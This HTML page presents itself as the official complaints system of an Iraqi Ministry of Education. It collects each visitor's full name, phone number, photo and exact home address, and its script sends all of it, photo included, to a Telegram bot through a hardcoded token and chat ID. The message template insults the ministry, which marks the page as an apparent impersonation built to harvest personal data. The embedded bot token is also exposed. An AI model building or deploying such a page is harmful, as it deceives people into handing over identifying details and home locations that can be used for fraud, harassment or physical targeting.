<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>بلاغات وزارة التربية</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma; background: #f0f5ff; color: #003366; }
        .container { max-width: 700px; margin: 20px auto; padding: 25px; border: 2px solid #d4d4d4; border-radius: 15px; background: white; }
        h1 { color: #cc0000; text-align: center; border-bottom: 3px solid #cc0000; padding-bottom: 10px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; font-weight: bold; }
        input, select, textarea { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; }
        button { background: #cc0000; color: white; border: none; padding: 15px; width: 100%; font-size: 18px; cursor: pointer; border-radius: 5px; }
        button:hover { background: #990000; }
        .required::after { content: " *"; color: red; }
    </style>
</head>
<body>
    <div class="container">
        <h1>نظام البلاغات الرسمي - وزارة التربية</h1>
        <form id="reportForm">
            <div class="form-group">
                <label for="fullName" class="required">الاسم الثلاثي</label>
                <input type="text" id="fullName" required>
            </div>
            <div class="form-group">
                <label for="phone" class="required">رقم الهاتف</label>
                <input type="tel" id="phone" required>
            </div>
            <div class="form-group">
                <label for="problem" class="required">وصف المشكلة</label>
                <textarea id="problem" maxlength="200" required></textarea>
            </div>
            <div class="form-group">
                <label for="photo" class="required">الصورة الرسمية (JPG/PNG)</label>
                <input type="file" id="photo" accept=".jpg,.jpeg,.png" required>
            </div>
            <div class="form-group">
                <label for="governorate" class="required">المحافظة</label>
                <select id="governorate" required>
                    <option value="">اختر المحافظة</option>
                    <option value="بغداد">بغداد</option>
                    <option value="البصرة">البصرة</option>
                    <option value="نينوى">نينوى</option>
                    <option value="أربيل">أربيل</option>
                    <option value="السليمانية">السليمانية</option>
                    <option value="دهوك">دهوك</option>
                    <option value="كركوك">كركوك</option>
                    <option value="ديالى">ديالى</option>
                    <option value="صلاح الدين">صلاح الدين</option>
                    <option value="الأنبار">الأنبار</option>
                    <option value="بابل">بابل</option>
                    <option value="كربلاء">كربلاء</option>
                    <option value="النجف">النجف</option>
                    <option value="واسط">واسط</option>
                    <option value="ميسان">ميسان</option>
                    <option value="ذي قار">ذي قار</option>
                    <option value="المثنى">المثنى</option>
                    <option value="القادسية">القادسية</option>
                </select>
            </div>
            <div class="form-group">
                <label for="location" class="required">موقع المنزل الدقيق (وصف يدوي)</label>
                <input type="text" id="location" placeholder="الحي، الشارع، رقم المنزل" required>
            </div>
            <button type="submit">أرسل البلاغ</button>
        </form>
    </div>

    <script>
    document.getElementById('reportForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const fullName = document.getElementById('fullName').value;
        const phone = document.getElementById('phone').value;
        const problem = document.getElementById('problem').value;
        const governorate = document.getElementById('governorate').value;
        const location = document.getElementById('location').value;
        const photoFile = document.getElementById('photo').files[0];
        
        // Convert image to base64
        const toBase64 = file => new Promise((resolve, reject) => {
            const reader = new FileReader();
            reader.readAsDataURL(file);
            reader.onload = () => resolve(reader.result);
            reader.onerror = error => reject(error);
        });
        
        const photoBase64 = await toBase64(photoFile);
        
        // Format message with emojis
        const message = `
🚨 **بلاغ جديد يا كلاب الوزارة** 🚨
        
👤 **الاسم:** ${fullName}
📞 **الهاتف:** ${phone}
🔥 **المشكلة:** ${problem}
📍 **المحافظة:** ${governorate}
🏠 **موقع المنزل:** ${location}

🖼️ **الصورة المرفقة:**
${photoBase64}
        `;
        
        // Send to Telegram
        try {
            await fetch(`https://api.telegram.org/bot8097003009:AAHNdM6R-_RamFOyz7P0ECL-tTXIda2EMog/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '7763665935',
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
            alert('تم إرسال بلاغك بنجاح!');
        } catch (error) {
            alert('خطأ في الإرسال!');
        }
    });
    </script>
</body>
    </html>
